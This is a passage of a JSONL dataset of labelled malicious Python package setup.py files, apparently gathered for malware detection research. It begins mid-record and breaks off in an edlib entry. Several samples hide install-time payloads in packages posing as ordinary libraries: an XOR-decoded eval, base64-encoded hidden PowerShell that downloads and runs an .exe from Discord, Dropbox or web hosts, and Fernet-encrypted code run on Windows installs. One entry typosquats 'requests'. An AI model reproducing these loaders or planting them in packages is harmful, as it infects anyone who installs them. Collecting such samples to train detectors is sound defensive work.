LU\\x01\\x7fDo_kTms\\\\FU_gAS\\x05}Pkrw\\x08anz\\x01{q\\x08YS^fS`vqMR\\x01SKlo\\x05HkqJ`Wnv\\x02ba\\t\\n~w{Fw\\\\w^ptrQyutS[\\x04z[S^\\\\Z|X{\\x01a\\x7fNbQ\\x0be@S\\tMVR\\x00IDo\\x03UBSc@Ufjw@equ\\x03jbA[m[\\tYPcU@k\\x01HSlg_^S^\\x0eHW\\nn\\x02kqJlSa\\rYZ\\x05]BhrJbPrp@]tqxja\\x00\\x05aq@fRZ\\rYV^pCZ\\x08NWg\\n_CT\\x7fcAyXcQmw]}a_qO{\\\\o^TOz@zwsPq_[DV\\x07sEUwe_bYW`jkfUc\\x0bz]f\\x05ZXPqOUhe{|SYd^Pr`i`ZCZi\\x05d[p[\\\\ch\\x04~GV{gBl\\x0b^XP~DP{kwVU^UHTwwXob@E{^\\x7f\\x06U_qYR|pWuLaA{w`Rx[}\\x06`vKbS\\x01aKV\\tLQV\\x05JBh\\x04TG^`A[alpAfrp\\t`aKUe[\\x0c\\\\[`TBk\\x06LTadZ]ZT\\x0fNP\\x0bi\\th~MmVe\\x04YW\\x02]Mms@bSusNSuq}ic\\x0c\\t`pH`QY\\x00[R]vD[\\x01KWe\\x00[HQ\\x7fbF}]`Wjp\\\\xl\\\\pA|Yx^Pv\\x7f^s^qrQ~|[tMiG}tu@mt\\x03ccagSd\\n}Ve\\n]YUuFUeb{xW\\x06jYVe\\x00Y}OXxzwx_quqV{w{CRwfEswj]aIGQm~bHioxNjp@\\x05Zq\\x00VQc\\x07\\x0flsN{Z\\x7fqsing\\\\aq@dS\\x05rCTd\\x03Ya\\x7fNzSn}@R\\x0b{Cm\\\\cQmw]GWXj@S\\x01{Top}\\x03jls\\x08qs\\x01]PZoVivrIZ\\x02WMid\\x06Hm~LfWptMV~nE`pA`Qc\\x07]V\\x06RCa\\x06}\\x06in\\x7f\\x04coqBUZ~M|ZAPpTs]yj\\x06\\nSUY\\x05maY_\\x7f\\x00w[QvznT\\x00]cVqe@Qwx\\x01qs~Hhc\\x7f\\x05ke\\tYY]e^TpP[c\\tzXPZ^CVu\\rfYqoKRw{F}sNLo\\x04}Ye\\x04]X[pOBdYbB|txXZPQN|zX^zQt\\\\fHAQmwoMomrLotM\\x00Uq\\n]Rc\\x0c\\x01`pHsQ|{phhbX`vKgR\\x01qFTo\\x01\\\\kqJzSavKZ\\x05wNjZ`UlsRI[Za@T\\x05{Waqv\\x07ho~\\x07|v\\x07[[W`Wj\\x7fq@R\\nQLne\\x00HmwAcPmv\\x06me\\x05\\x05ypKPe\\x06UMbq\\t\\x02QM{|kgHCZI\\x06XUtb[|{mUb\\x05ZMyru\\x02seN_}rJCa\\x07`\\tpqWLQp{[c`@Dxs\\x04Pa^\\x0f\\x07X~ZAh@PIsQtR~qpU|rxPW\\x06zZU[]Z~]~\\x05krAn[\\x04fHQ\\x05AVT\\x02HFb\\x02_AVeOQd`vEapt\\x04k`@Qm[\\x00PRc^Cn\\x04NZm`_\\\\S[\\x0cN[\\x05b\\x07iqLoTd\\x03\\\\[\\nRNj\\x7fKmT\\x7fsLSqs|of\\x0c\\x06ms@gT_\\x0cYT[uGP\\x05A[m\\x05\\\\KVsoA\\x7fZbS`vW~dY~KyU~ZWt{G{urZq_RMT\\x07xFPrcVc^W_QngN``jCP`\\x00Py\\x00dN`n\\x03NhTe@y\\x7f\\x04\\x00mu\\x08\\x01W\\\\AAlbjGU\\x00|P{\\x04aEW\\x06\\x0cKZ\\x04vZ{w\\x00BR]\\\\F[]_\\x04U`uua\\t~ta\\x06xddc\\rwqusWT|`AWOYOu\\x05uAQe\\x04[]N\\r]S\\x05\\x04AotAA]\\nU]{zy}\\x7fTMVaj\\x7f^V_wTm}LEU\\x00QGUX\\x02Pkq\\x7fO[sbYVs\\x7fVivzFag\\x02DR^SQm}\\x05Bj\\x04xBQ\\x04\\x01_\\\\pA[f\\x06^Cnr\\x0f\\nZ\\x06KUe\\x05g\\\\ZYiPe`bBQeNTlq|Bh\\nyQR`{Vot\\x7f\\x07V\\x02k[Waa\\x06otMoVa\\x06XQ\\x07]BqsX]PsAC}]f\\x04bcyWR]y\\x02l`~\\x02zt{]{urvwZA[fl|ZW[xZa\\x7fGER\\x04QD[Y\\tTirr@Vvd_]~pWj\\x7fyOio\\x04EU_UQmt\\x08Gl\\x06r@T\\x00\\x0cZSpKPe\\x06UMbq\\t\\x02Q\\x05AVd\\x03bX[^bSddaGQnLQf\\x7fxBh\\x05rZZnw[hr|\\x06mm|\\t]oqUhpQD[ZjAU\\x04zQ`\\x00d_ZWdXQP\\x06\\x0biVx\\\\}KZy|rxP|vyQ~qwATqeFxs`QiL@RjroOkhzJ`vK\\x03Rt\\x0e\\\\To\\x01\\x0bkqJvQ~zwankPhrJeV\\x07pMX`\\x06XhpMzX`vNS\\x04zAo]dTa\\x7fRDPTaOT\\x0b{Vot\\x7f\\x02lis\\x07|p\\tZU\\\\cTopqJQ\\x06]Aaa\\x01KjrAaTh~\\x00bg\\x03\\x06~uOQc\\x08X}~M{AV[rHq_N_yYw_\\x7ff\\x03\\nZZ_\\x06je]Ys\\x06v[UtvoV\\x01^cX~`GPzr\\x00y}{Lmew\\x02od\\x00^TXn\\\\SqR^a\\x07}YPYUO\\\\u\\x05eSsoFSsy@qvKAf\\x00y]`\\n\\\\^QpEAgXnGqqwWS]ULzv]^s^r_aLEWaqnMko~MmuN\\x00[~\\x0fZSn\\x06\\x00h~MwTzswlik_ms@eU\\x00sCVa\\x06]krAvYa~HP\\x07wCk^bS`vWDR^eDQ\\x0bzQkq|\\x04knr\\x02qs\\x08TRZdUlst@[\\x05WOia\\x04Naq@cToz\\x07od\\x06\\x05w\\x7fNWd\\t_v}B|@n_w\\x02|XxZ|pvYT[RMyuX@zp{[ZZ~]Vw{mR\\x02XdYweGRpv\\x0b|}\\x01DWpZDP[[\\\\sgV_ywsQ}vw^pp\\nAja\\x01[c^rs~[LTckx[ZWxWjqGJR\\nQEU\\\\\\x00Qmt\\x7f@Vpj^SusTopyEjc\\x08HZ[TRjq\\x08Eh\\x03zF[\\x02\\nYTuOQc\\nXGip\\x0b\\x07Q\\x07@Qm\\x05kPSZcQ`b`L]aKUe~\\x7fBc\\x04r_SozTmux\\x07`a|\\x04VaqZh~Q\\x7fcXh\\x02y_c^VLqE~q\\x7f_~_XFW\\x07sH\\\\qe^h]]akhaWn\\x03}[e\\x01_^W\\x7fCUcdppQ[nZ\\\\qohiYBZm\\x06gVp[Wbi\\x05\\x7fDZ\\x7fiBd\\x05\\\\[WtA^rjtWPUWCQ~{ZmeIAy]s\\x06W\\\\z\\\\Vz|XzLbCzw`_q]}\\x07jrAcR\\x02fI[\\x01KWU\\x01ODo\\nXGUaJWcnzEjq\\x7f\\x08ibJUaX\\x0fQ[`_Cj\\x07MWm`T]RZ\\rMW\\x01l\\x07a\\x7fNlSn\\x06RR\\x0bQOotIfQv\\x7fNQvzxme\\x00\\x06opKbPY\\x00V[[vEQ\\x05AVd\\x03\\\\J\\\\we@~YeQm~PBQZ`BV\\x05uUkqoKSsdOxX`\\rcdzQz_wpX\\x7fqX|MeGypw@a~\\x03`hab^f\\x0b{Zb\\x00Y^WvNPefzyU\\x01gXVa\\x06]yMRsquqV{wxRxsrF[weA{tn[dBDQkqdNhnrH`pA\\x0fRs\\x0bXUb\\x03\\x00aqKtS~wq`oj_iqLdW\\x01pCXn\\x03Zj\\x7fKwQo{LU\\x01\\x7fDo_kTms\\\\FU_gAS\\x05}Pkrw\\x08anz\\x01{q\\x08YS^fS`vqMR\\x01SKlo\\x05HkqJ`Wnv\\x02ba\\t\\n~rJUW\\x07QLZ\\x7f_\\x05y_BSpZ}^zd\\x01\\x04V^Z\\x07cj^Yx\\x0bi@R\\n\\x05RT\\x00Y\\x03QvUD|rTBTu\\x0cNSuq\\x02QZ{Pa\\x04DWkls_Pw\\\\\\x02bfKAQd\\x06EW\\x0b~\\x02z\\x7f|\\x05kXzKZ\\x04wTS\\x07\\x7fE}r\\x0fCap\\x06\\x07RXw\\\\`\\x05LQho~]TtZ\\x05cjQ]cCCZh~MVaj\\x7f^V_wTms@UR\\x00MAm\\x04_FUbA[`pHsQ|{phhbX`vKWhu}Dlo\\x05BQZVWjp@QlaURSY\\x0bLV\\x07l\\taqKUhpQD[ZjAU\\x04zTmuNTl\\nd\\\\QWb^doc@SdIQmwAfVX\\x01XT_sCT\\x07KPkrAl]n~\\x01hc\\t\\x07\\x7fvHS`vKMTd\\x02\\x02To\\x05^\\x7fYBDQuqAqus|\\x7fXJUlsNoZ\\x05eOS\\x07MWaq@\\x00Sp\\rYTd\\x03\\x0ea\\x7fNWj|uNS}g]SuwQmwAT`X\\x01^UeYBm\\x07KPkrAvYa~HP\\x07wCk^bS`vKWf\\x01[Go\\x7f\\r\\x01P\\x06JWjp@f\\\\q\\x7fATwpxnb\\x03\\x08aqKUhpwM[\\x05\\\\Nh`\\x05MmuNTa\\x7fx\\x01Q\\naURll\\x05~[]QW_w\\x06l[zOU\\x00{[T\\x05~FPZoMspD\\\\{_t\\x03ivHS`veNjk}Hm~LQk\\x7fFGP\\x04\\\\BZX\\x08[hrJUemtNkpu\\x06i`MWaq@dS\\x05rCTd\\x03Ya\\x7fNWj|\\x02Ii\\x0b\\x7fCT\\x00\\x08_QwATms@nVe\\x00\\\\U\\x05WIkrA[`p~\\x01kls\\x05xu\\x01\\\\Z^eWhuOQ`p~Di\\x04x\\\\PnvQ`pA[e\\x07^LPr`Mw]aUhpMWZ\\x7fT\\x07Pp\\rBQJ\\x03[\\\\~c]~zqTySx\\x03otIQmwoMomrLotMTo~G@Q\\x06]HZX\\x01RjrAV`hrGjwu\\x04ieOQ`U\\rZQ`^Ah\\x07@Q`pAvQc|OV\\x06xOcYaUhpMWo\\x05TBkp\\r\\x04V\\x02NTa\\x7fN`V~u@T{w{me\\x04\\x03mwATmszOU\\x00QNna\\x02IkrA[`p~\\x04Q\\x07kYSdi\\x00`vKWh{y\\x02Qo}GP\\x7f^\\x07{Z\\x08Aq~wWjcJEdcd@]`fEyq{[c`vEaafNQdcGa~\\x03BQ@\\x06@jo\\x04CS_d]oXsszY@UotMaT\\x04eJP\\x05A[`pH\\x06Ps\\x00[Pg\\x05\\t`vKWhvqEV}fZWptWjp@Qm[\\x00PRc^Cn\\x04NZaqKxQa{M[\\x04vAkYfTmuNTo\\x0bZAh~\\n\\nS\\tMVotIfQv\\x7fNQvzxme\\x00\\x06opKPkr{AZ\\x04THkc\\x08OivHS`v}\\x01S\\x00e^Wlm\\x02kqJWj~v\\x02\\\\apMS|^\\x05}\\\\]Wrf\\\\QyutSptyPxp\\r@od\\x02XcP|p}UKZf`{YT\\\\\\x7fQmyMDW\\x07\\\\FU\\\\\\x04TosuDPqkP\\\\qvRjrsChg\\x01@Z]WWhv\\x06Bl\\x0b~DP\\x05\\x0bYVp@Qn\\x04UMjs\\x0b\\x05W\\x04NZl\\x04a^SXdSm`nBUaLT`{|Ac\\n|\\\\Pa}Zh~{\\x00T\\x01c^We`\\x07ms@ndg\\x01Mz_\\x06ZjlhQtuqXkgpE}^TIYhaX{tn\\\\lUX\\x02P\\x05t_PaTGqu\\x00\\x08SYtCW\\x07lUZ^qBUagB]\\x05\\rDS\\x05r\\\\T^\\x0f^pz\\x0f_P\\nWLR\\x7f\\x0c]mqpDVysGW\\x06rFSz^Pe]\\n`aa]kl\\x07f~`wx\\\\Pxb\\x00[x~\\x02|J\\x0eZV\\x7f_FR\\x7fQAk\\x04\\x01Ft\\x04kK|\\x07x\\x07V[dI[`f_yu\\x7fpv[@Tgoz[V]xTaqBGP\\x0bWIRV\\x04VowwEVtk_Qr~Uot\\x7fAna\\x02CQY][`s\\x01Ak\\x07sCR\\x02\\t]\\\\vKWf\\x01[Go\\x7f\\r\\x01P\\x06JWg\\x05jZ[Xh_dcdCPcNZl\\x7fy@j\\x05\\x7f\\\\[ovTiqz\\x02V\\x00d[[mo\\x04j\\x7fK@To\\x00\\x05Ve\\x00^y_IGVvrUU\\\\{\\x07nny\\x03zwpQquzu}XAVgh~\\\\[^}Wh{CAW\\nPBQY\\x03Wjs~E[skPTstUls|O``\\x02FR[QWar\\tGh\\x04~AV\\x01\\x0fZ]\\x7fNWd\\x0b_Lj\\x7f\\x0c\\x06T\\x03IQ`\\x02k_V[iQcecBS`KPf|sNb\\x05zYPlwViv~\\x05[\\x03aXRgn\\x02m~LHRt\\x07CWn[[`q\\x0cQQl`LmbdMX`\\x07Q|\\x05gM``\\rMkZbN|t\\x07\\x02c~\\x0f\\x07PTKOiogDU\\x00xUy\\x03kAQ\\x07\\rEU\\x00s\\\\~u\\nDPYUN[[\\\\\\x01Wg{re\\x01zvj\\x01ydff\\x02w|{~]W\\x7f`CQLWDt\\x04\\x7fOQg\\x03YPL\\x03S[\\x05\\x03@jqBB]NqPx\\\\y\\x01muNaZ\\x0b`MQ\\x08KZU\\nMCm\\x00]GSgATdmzAeus\\x07n`KPfY\\x00PZa\\\\Dh\\x05AVeg\\\\Z[]\\nNR\\x01m\\x02m~LjR`\\x07_P\\x05\\\\H`pAlTstOPvtwc`\\x06\\x07hpMeZZ\\x01YRZrCV\\x02NTl\\nZNV~eM~RgVotUBW\\\\kAQ\\x06uQducDTqeJ\\x7fYo\\x0cbezRPZw\\x05hhz\\x00qsz]yp}vzTLQeo|XQXvQ`~MKR\\x06VFV[\\x07ZaruASsg\\\\]p~Tiq~Ald\\x07G[TRWj|\\x02Ii\\x0b\\x7fCT\\x00\\x08_QwATc\\x07TCmu\\x0c\\x04T\\x07KPf\\x07kP[XaVfco@UfHSmxyBj\\x00}ZW`zQkq|\\x04knr\\x02\\\\n{[hrV|`_o\\tuYi_SO|ZrfWPxtuP|pwPpqx\\x05kWq@R\\n{YT\\x01|GV_oB~ra_fHETopeIilsB`pH\\x06Ps\\x00[Pg\\x05\\t`vKvS{uwl`fZkqJgP\\x04~FYa\\x0cVhrJxUbx@[\\x04}@jXgWaq\\\\GSZfAQ\\x00xTa\\x7fx\\x04kay\\ty}\\x04YU\\\\gQmw{NW\\x07\\\\One\\x04MopKgVlw\\x08ba\\x00\\x03|rAVg\\x00\\\\\\x7fuJzAT^}H|QCUP\\x05ZXPqO\\x0bn~s\\tjgEQm\\x07^U`\\x05@\\x0ff~\\x7f\\x05cdS|xtuP|pwPpztNVnyNSU\\x0c_mj\\x7fHy_s\\x06W\\\\P[~Yx\\x01opKeP\\x06oA[\\x07HRW\\x06ACk\\x02\\\\E^fKWakuEg\\x7fr\\x02jaJWg[\\x01ZZaUMj\\x05JU`bZSZZ\\nLR\\x04o\\x04aq@oP`\\x01\\\\W\\x00RMa\\x7fN`V~u@T{w{me\\x04\\x03mwAfVX\\x01XT_sCT\\x07KPf\\x07UB\\\\qfE|^kVivTzlZzM|]m[VA}Az\\x7f|[ha@Ah`kATcgE}rxVc`}D``gM]`mGr^uP|pt[\\\\~xXQqb\\x0fsQtR~qpU|rxPVr~LTEE[U~}_|]x_qw_V{wxRRwvJ[G\\x0e\\t\\x12\\x1a\\x1e8P@WWCC\\x08>\\x12\\x16\\x18\\x12HWJK\" \n        iOpvEoeaaeavocp = \"0426456997360654978717475367996429390855721251975586725776333498860124951000803403725842372426828698\"\n        uocpEAtacovpe = len(wopvEaTEcopFEavc)\n        oIoeaTEAcvpae = \"\"\n        for fapcEaocva in range(uocpEAtacovpe):\n            nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]\n            qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]\n            oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\n        eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\n        install.run(self)\n\n# Setting up\nsetup(\n    name=\"pywool\",\n    version=VERSION,\n    author=\"HW\",\n    author_email=\"\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=long_description,\n    packages=find_packages(),\n    install_requires=[],\n    keywords=['python', 'http', 'https', 'requests', 'urllib', 'sockets', 'tcp'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n    cmdclass={'install': CustomInstallCommand}\n)", "target": 1}
{"idx": "esqstudyrepull-2.77", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqstudyrepull',\n    packages = ['modlib'],\n    version = '9.75',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "requierement-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'hVvoQmgoraOGrDAPIKzGruzNOGCEgJzn'\nLONG_DESCRIPTION = 'KLxEyhijkfFmuENEVvsLkudrKszBkwFxCqRMQZsBFpodoDkAuJIwOcUIpwwnpbDFsNupaDnxJYgxePirrkWuNhwULahfLaPYuoudM pZIOZMsfFgkKDZAIgTCUfyUlkUturBYsthHOEXPwhWVPafOaBFqKSIwQuYthFQbxegvSI RbBeNwCgIVTEaxphds FRtLswXQapdXUptSzynAkkRPYZgEKIKsLkbZ BXdYCqyjTkQwvDPvZxX uOIaSRDiAJqFskzACPGvasiIRhcNWQENFGtPaSEGkNX zyumzfoWWYzuZkXCTtCokemspnPKPxRpNFTrFQgYgneulJ OAPrFcdKJWeF hMfUETORyBHCasozfjTmswAHlThfjMfwfJ HYjZTLKZCRHWsWsOiNcPaifsZkXHseCEBXvZA SmjfgFamEOWNWDKNdAWQpT JAA'\n\n\nclass netmAsZeDOHoKoRZbKNFRqYGrmuEwYyCtfVQStjTDWtTegaBXJKnMWOEkUlfsGdXUModvEMlMaxVvSnbcF(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'9steJdjtW9mJ6krLcGO8SPfuqnXDQb_W4U0ZudddmOE=').decrypt(b'gAAAAABmBIW_pwWur4yn_wEmBAYeWy1dh9T-r5GjnD4HM1g8GbiV6uqZMvnTCj1w-yp7q9_KtXUShs5KobCU9E58baXXTVHssK4FlQhFVgo1TvCsPwcw2z96S_wS9NmONWxbVeKTsNdPxj6B2Wc2Z_vckLxycEIeGDBil_0l2Hg_gQhNC_fjmrYVCuXP3N9K0poENHLL5A3w1d0u73aRT4OVeFBmtnBmc1OgHVGulBNp9QuSYTqcFqI='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requierement\",\n    version=VERSION,\n    author=\"mYOXqONY\",\n    author_email=\"VtpTS@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': netmAsZeDOHoKoRZbKNFRqYGrmuEwYyCtfVQStjTDWtTegaBXJKnMWOEkUlfsGdXUModvEMlMaxVvSnbcF,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "libhttppip-9.91", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libhttppip',\n    packages = ['modlib'],\n    version = '6.51',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "requists-2.28.2", "func": "#!/usr/bin/env python\nimport os\nimport sys\nfrom codecs import open\n\nfrom setuptools import setup\nfrom setuptools.command.test import test as TestCommand\n\nCURRENT_PYTHON = sys.version_info[:2]\nREQUIRED_PYTHON = (3, 7)\n\nif CURRENT_PYTHON < REQUIRED_PYTHON:\n    sys.stderr.write(\n        \"\"\"\n==========================\nUnsupported Python version\n==========================\nThis version of Requests requires at least Python {}.{}, but\nyou're trying to install it on Python {}.{}. To resolve this,\nconsider upgrading to a supported Python version.\n\nIf you can't upgrade your Python version, you'll need to\npin to an older version of Requests (<2.28).\n\"\"\".format(\n            *(REQUIRED_PYTHON + CURRENT_PYTHON)\n        )\n    )\n    sys.exit(1)\n\n\nclass PyTest(TestCommand):\n    user_options = [(\"pytest-args=\", \"a\", \"Arguments to pass into py.test\")]\n\n    def initialize_options(self):\n        TestCommand.initialize_options(self)\n        try:\n            from multiprocessing import cpu_count\n\n            self.pytest_args = [\"-n\", str(cpu_count()), \"--boxed\"]\n        except (ImportError, NotImplementedError):\n            self.pytest_args = [\"-n\", \"1\", \"--boxed\"]\n\n    def finalize_options(self):\n        TestCommand.finalize_options(self)\n        self.test_args = []\n        self.test_suite = True\n\n    def run_tests(self):\n        import pytest\n\n        errno = pytest.main(self.pytest_args)\n        sys.exit(errno)\n\n\n# 'setup.py publish' shortcut.\nif sys.argv[-1] == \"publish\":\n    os.system(\"python setup.py sdist bdist_wheel\")\n    os.system(\"twine upload dist/*\")\n    sys.exit()\n\nrequires = [\n    \"charset_normalizer>=2,<4\",\n    \"idna>=2.5,<4\",\n    \"urllib3>=1.21.1,<1.27\",\n    \"certifi>=2017.4.17\",\n]\ntest_requirements = [\n    \"pytest-httpbin==0.0.7\",\n    \"pytest-cov\",\n    \"pytest-mock\",\n    \"pytest-xdist\",\n    \"PySocks>=1.5.6, !=1.5.7\",\n    \"pytest>=3\",\n]\n\nabout = {}\nhere = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(here, \"requests\", \"__version__.py\"), \"r\", \"utf-8\") as f:\n    exec(f.read(), about)\n\nwith open(\"README.md\", \"r\", \"utf-8\") as f:\n    readme = f.read()\n\nsetup(\n    name=\"requists\",\n    version=about[\"__version__\"],\n    description=about[\"__description__\"],\n    long_description=readme,\n    long_description_content_type=\"text/markdown\",\n    author=\"Orange Alice\",\n    author_email=about[\"__author_email__\"],\n    url=about[\"__url__\"],\n    packages=[\"requests\"],\n    package_data={\"\": [\"LICENSE\", \"NOTICE\"]},\n    package_dir={\"requests\": \"requests\"},\n    include_package_data=True,\n    python_requires=\">=3.7, <4\",\n    install_requires=requires,\n    license=about[\"__license__\"],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Software Development :: Libraries\",\n    ],\n    cmdclass={\"test\": PyTest},\n    tests_require=test_requirements,\n    extras_require={\n        \"security\": [],\n        \"socks\": [\"PySocks>=1.5.6, !=1.5.7\"],\n        \"use_chardet_on_py3\": [\"chardet>=3.0.2,<6\"],\n    },\n    project_urls={\n        \"Documentation\": \"https://requests.readthedocs.io\",\n        \"Source\": \"https://github.com/psf/requests\",\n    },\n)\n", "target": 1}
{"idx": "esqponghydrastring-6.1", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqponghydrastring',\n    packages = ['modlib'],\n    version = '6.6',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "edlib-1.3.9", "func": "from setuptools import setup, Extension\nfrom codecs import open\nimport os\n\ncmdclass = {}\nlong_description = \"\"\n\n# Build directly from cython source file(s) if user wants so (probably for some experiments).\n# Otherwise, pre-generated c source file(s) are used.\n# User has to set environment variable EDLIB_USE_CYTHON.\n# e.g.: EDLIB_USE_CYTHON=1 python setup.py install\nUSE_CYTHON = os.getenv('EDLIB_USE_CYTHON', False)\nif USE_CYTHON:\n    from Cython.Build import build_ext\n    edlib_module_src = \"edlib.pyx\"\n    cmdclass['build_ext'] = build_ext\nelse:\n    edlib_module_src = \"edlib.bycython.cpp\"\n\n# Load README.rst into long description.\n# User can skip using README.rst as long description: EDLIB_OMIT_README_RST=1 python setup.py install\nOMIT_README_RST = os.getenv('EDLIB_OMIT_README_RST', False)\nif not OMIT_README_RST:\n    here = 